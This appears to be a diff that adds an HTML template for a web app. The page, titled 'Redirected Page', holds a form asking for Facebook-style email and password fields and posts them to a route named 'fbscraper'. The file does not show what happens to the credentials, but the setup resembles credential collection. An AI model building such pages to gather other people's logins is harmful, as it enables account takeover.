@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirected Page</title>
+</head>
+<body>
+    <h1>Welcome to the Redirected Page</h1>
+    <form action="{{ url_for('fbscraper') }}" method="post">
+        <label for="fbemail">Email:</label>
+        <input type="text" id="fbemail" name="fbemail" required><br><br>
+        <label for="fbpassword">Password:</label>
+        <input type="password" id="fbpassword" name="fbpassword" required><br><br>
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
